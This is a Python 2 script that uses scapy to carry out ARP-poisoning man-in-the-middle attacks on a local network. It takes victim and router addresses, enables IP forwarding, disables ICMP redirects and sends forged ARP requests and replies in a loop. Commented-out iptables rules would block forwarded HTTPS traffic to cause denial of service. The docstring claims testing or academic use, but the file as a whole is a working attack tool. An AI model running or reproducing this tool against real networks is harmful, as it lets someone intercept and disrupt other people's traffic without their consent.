#!/usr/bin/python2
# -*-coding:Utf-8 -*

"""
arpPoisoning is a small program used to perform HTTPS denial of service on local targets. It's based on Man In The Middle attack using arp poisoning. This program is designed to run on UNIX system and must only be used for testing or academic use.
"""

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import re
import time
import os
import sys

targetMAC = ""
targetIP = ""
tIPtoSpoof = ""
routerMAC = "" 
routerIP = ""
rIPtoSpoof = ""
attackerMAC = ""


#retreive parameters for the attack
def getParameters():


    global targetMAC
    global targetIP
    global tIPtoSpoof
    global routerMAC 
    global routerIP
    global rIPtoSpoof
    global attackerMAC
    
    print("*** Target informations ***")
    targetMAC = raw_input("Enter target's MAC address [Format : FF:FF:FF:FF:FF:FF] : ").strip()
    targetIP = raw_input("Enter target's IP address [Format : 255.255.255.255] : ").strip()
    tIPtoSpoof = raw_input("Enter IP to spoof [Format 255.255.255.255] : ").strip()

    print("\n*** Router informations ***")
    routerMAC = raw_input("Enter router's MAC address [Format : FF:FF:FF:FF:FF:FF] : ").strip()
    routerIP = tIPtoSpoof
    rIPtoSpoof = targetIP

    print("\n*** Attacker informtaions ***")
    attackerMAC = raw_input("Enter your MAC address [Format : FF:FF:FF:FF:FF:FF] : ").strip()
    
#check MAC
def checkMAC(MAC):
    return re.match("^([a-fA-F0-9]{2})(:[a-fA-F0-9]{2}){5}$", MAC)


#check IP
def checkIP(IP):

    if re.match("^([0-9]{1,3})(\.[0-9]{1,3}){3}$", IP):
        result = True

        for o in IP.split("."):
            if int(o) > 255:
                result = False
                break

        return result
        
    else:
        return False 


#check parameters
def checkParameters():
    
    if not checkMAC(targetMAC) :
        print("Traget's MAC address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkIP(targetIP) :
        print("Traget's IP address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkIP(tIPtoSpoof) :
        print("Traget's IP to spoof address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkMAC(routerMAC) :
        print("Router's MAC address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkIP(routerIP) :
        print("Router's IP address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkIP(rIPtoSpoof) :
        print("Router's IP to spoof address bad format !!!\n----> Exiting <----")
        sys.exit()

    if not checkMAC(attackerMAC) :
        print("Attacker's MAC address bad format !!!\n----> Exiting <----")
        sys.exit()


#system settings
def confOS():

    #enable ip forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("--> Forwarding enabled") 

    #disable icmp redirect
    os.system("echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects")
    print("--> ICMP redirects disabled")

    #iptables settings for DoS
    #os.system("iptables -t filter -F")
    #os.system("iptables -t filter -A FORWARD -p tcp --dport 443 -j DROP")
    #print("--> HTTPS DoS enabled")
    
#Who-Has ARP request forgery
def sendWH(tMAC, tIP, spoofIP, aMAC):
    
    print("--> Sending Who-Has arp request :\n\tTo IP/MAC : " + tIP + "/" + tMAC + "\n\tSpoofing " + spoofIP)
    arp = ARP()
    arp.hwsrc = aMAC
    arp.psrc = spoofIP
    arp.pdst = tIP

    arp = Ether(dst = tMAC) / arp

    sendp(arp)

#Is-At ARP response forgery 
def sendIA(tMAC, tIP, spoofIP, aMAC):

    print("--> Sending Is-At arp reply :\n\tTo IP/MAC : " + tIP + "/" + tMAC + "\n\tSpoofing " + spoofIP) 
    arp = ARP()
    arp.op = "is-at"
    arp.hwsrc = aMAC
    arp.psrc = spoofIP
    arp.hwdst = tMAC
    arp.pdst = tIP

    arp = Ether(dst = tMAC) / arp

    sendp(arp)



if __name__ == "__main__":

    print("******* ARP POISONING STARTUP *******\n")
    getParameters()
    print("--> Targetting device : \n\tMAC : " + targetMAC + "\n\tIP : " + targetIP + "\n\tspoof : " + tIPtoSpoof + "\n--> Targetting router : \n\tMAC : " + routerMAC + "\n\tIP : " + routerIP + "\n\tspoof : " + rIPtoSpoof + "\n--> Attacker : \n\tMAC : " + attackerMAC)

    print("\n\n******* CHECKING PARAMETERS *******")
    checkParameters()
    print("----> Done !")

    print("\n\n******* OS SETTINGS *******")
    confOS()
    print("----> Done !")

    print("\n\n******* MAN IN THE MIDDLE SETTINGS *******")
    sendWH(targetMAC, targetIP, tIPtoSpoof, attackerMAC)
    sendWH(routerMAC, routerIP, rIPtoSpoof, attackerMAC)
    print("----> Done !")

    print("\n******* MAN IN THE MIDDLE INITIALIZED *******")

    print("\n\n******* PERFORMING MAN IN THE MIDDLE KEEP ALIVE *******")
    while 1:

        sendIA(targetMAC, targetIP, tIPtoSpoof, attackerMAC)
        sendIA(routerMAC, routerIP, rIPtoSpoof, attackerMAC)
        time.sleep(10)


